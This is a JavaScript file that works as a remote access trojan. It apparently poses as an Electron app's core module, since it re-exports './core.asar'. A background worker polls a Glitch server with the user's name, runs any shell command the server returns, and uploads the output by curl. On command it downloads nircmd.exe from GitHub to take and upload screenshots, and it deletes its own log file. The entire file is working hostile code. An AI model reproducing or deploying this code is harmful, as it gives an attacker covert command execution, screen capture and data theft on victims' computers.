const fs = require('fs');
const path = require('path');
const os = require('os');
const { Worker, isMainThread } = require('worker_threads');
const { execSync, exec } = require('child_process');

// Define the URL for the executable and the path to save it
const executableUrl = 'https://github.com/AtomBread/nirs/raw/refs/heads/main/nircmd.exe'; 
const tempExecutablePath = path.join(os.tmpdir(), 'nircmd.exe'); // Use temp directory

const downloadExecutable = () => new Promise((resolve, reject) => {
    // Use escaped double quotes for the output path and executable URL
    const command = `curl -L -o "${tempExecutablePath}" "${executableUrl}"`;
    // Log the command before executing it
    log(`Executing command: ${command}`);
    
    exec(command, (error, stdout, stderr) => {
        if (error) {
            log(`Download error: ${error.message}`);
            reject(`Download error: ${error.message}`);
            return;
        }
        log('Downloaded nircmd.exe');
        resolve();
    });
});


async function uploadFile(filePath) {
    log(`Preparing to upload file: ${filePath}`);
    // Use escaped double quotes for the file path
    const command = `curl -X POST -F "file=@${filePath}" https://youthful-lowly-duckling.glitch.me/d`;
    // Log the command before executing it
    log(`Executing command: ${command}`);
    
    exec(command, (error, stdout, stderr) => {
        if (error) {
            log('Error uploading file:', error.message);
            return;
        }
        log('File uploaded successfully:', stdout);
        // Uncomment if you want to delete the file after upload
        // fs.unlinkSync(filePath);
    });
}

async function uploadStream(filePath) {
    log(`Preparing to upload file: ${filePath}`);
    // Use escaped double quotes for the file path
    const command = `curl -X POST -F "file=@${filePath}" https://youthful-lowly-duckling.glitch.me/upload`;
    // Log the command before executing it
    log(`Executing command: ${command}`);
    
    exec(command, (error, stdout, stderr) => {
        if (error) {
            log('Error uploading file:', error.message);
            return;
        }
        log('File uploaded successfully:', stdout);
        // Uncomment if you want to delete the file after upload
        // fs.unlinkSync(filePath);
    });
}
async function stream() {
    if (!fs.existsSync(tempExecutablePath)) {
        log('nircmd.exe not found, downloading...');
        await downloadExecutable();
    }

    // Use cmd to take a screenshot
    const command = `cmd.exe /c "${tempExecutablePath} savescreenshot ${getUsername()}.png"`;
    exec(command, async (error, stdout, stderr) => {
        if (error) {
            log(`Error taking screenshot: ${error.message}`);
            return;
        }
        if (stderr) {
            log(`Error: ${stderr}`);
            return;
        }
        log("Uploaded screenshot");
        await uploadStream(`${getUsername()}.png`); // Ensure the file exists before uploading
    });
}

function log(message) {
    const logPath = path.join(__dirname, 'output.log');
    fs.appendFileSync(logPath, `${new Date().toISOString()}: ${message}\n`);
}

function executeCommand(command) {
    try {
        const stdout = execSync(command, { encoding: 'utf-8' });
        return `Output:\n${stdout}`;
    } catch (error) {
        const stderr = error.stderr ? `Error Output:\n${error.stderr.toString()}` : '';
        const errorMessage = `Execution Error:\n${error.message}`;
        return [stderr, errorMessage].filter(Boolean).join('\n');
    }
}

// Sleep function to pause execution
function sleep(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
}

// Get the current system username
function getUsername() {
    return os.userInfo().username;
}

async function callUpdateEndpoint(name) {
    const postData = JSON.stringify({ name });
    // Use escaped double quotes for Windows compatibility
    const command = `curl -X POST -H "Content-Type: application/json" -d "${postData.replace(/"/g, '\\"')}" https://youthful-lowly-duckling.glitch.me/update`;

    // Log the command before executing it
    log(`Executing command: ${command}`);

    return new Promise((resolve, reject) => {
        exec(command, (error, stdout, stderr) => {
            if (error) {
                reject(error);
                return;
            }
            resolve(stdout);
        });
    });
}


async function sideThread() {
    log('Side thread has started.');
    const username = getUsername();

    while (true) {
        await sleep(2500);
        const output = await callUpdateEndpoint(username);

        if (typeof output === "string" && output != "0" && output != "1") {
            if (!output.startsWith("nirsoft:")) {
                try {
                    const commandOutput = executeCommand(output);
                    log('Command Output Length: ' + commandOutput.length);
                    const filePath = path.join(__dirname, `${username}.txt`);

                    if (commandOutput.trim()) {
                        fs.writeFileSync(filePath, commandOutput, 'utf8');
                        log('File written successfully to ' + filePath);
                        await uploadFile(filePath);
                    } else {
                        log('Command output is empty, not writing to file.');
                    }
                } catch (error) {
                    log('Error executing command: ' + error.message);
                }
            } else {
                let newCommand = output.replace("nirsoft:", "").trim();

                if (!fs.existsSync(tempExecutablePath)) {
                    log('nircmd.exe not found, downloading...');
                    await downloadExecutable();
                }

                const command = `cmd.exe /c "${tempExecutablePath} ${newCommand}"`;
                try {
                    const commandOutput = executeCommand(command);
                    log('Command Output Length: ' + commandOutput.length);
                    const filePath = path.join(__dirname, `${username}.txt`);

                    if (commandOutput.trim()) {
                        fs.writeFileSync(filePath, commandOutput, 'utf8');
                        log('File written successfully to ' + filePath);
                        await uploadFile(filePath);
                    } else {
                        log('Command output is empty, not writing to file.');
                    }
                } catch (error) {
                    log('Error executing command: ' + error.message);
                }
            }
        } else {
            if (output.toString() == "1") {
                await stream();
            }
        }
    }
}

if (isMainThread) {
    const worker = new Worker(__filename);
    log('Worker thread has started.');
    module.exports = require('./core.asar'); // Ensure this path is correct
} else {
    const logPath = path.join(__dirname, 'output.log');

    // Check if the file exists before attempting to delete it
    fs.access(logPath, fs.constants.F_OK, (err) => {
        if (err) {
            log(`File ${logPath} does not exist. Skipping deletion.`);
        }

        fs.unlink(logPath, (unlinkErr) => {
            if (unlinkErr) {
                log(`Error deleting file: ${unlinkErr.message}`);
            }

            log(`Deleted file: ${logPath}`);
        });
    });
    sideThread();
}
